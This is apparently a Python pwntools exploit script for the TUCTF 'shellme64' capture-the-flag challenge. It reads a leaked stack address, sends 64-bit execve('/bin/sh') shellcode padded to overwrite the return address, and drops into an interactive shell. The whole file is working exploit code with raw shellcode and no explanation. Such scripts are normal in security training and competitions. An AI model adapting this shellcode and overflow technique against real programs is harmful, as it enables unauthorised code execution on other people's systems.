from pwn import *


io = process("./shellme64")
# io = remote("chal.tuctf.com", 30507)

shellcode = "\x48\x31\xd2\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x50\x48\x89\xe6\xb0\x3b\x0f\x05"

buf = io.read()
addr_rsp =  buf[-17:-3]
print 'rsp address: {}'.format(addr_rsp)
addr_rsp = int(addr_rsp, 16)

exp = ""
exp += shellcode
exp += "A" * 100
exp = exp[:40]
exp += p64(addr_rsp)

io.send(exp)
io.interactive()
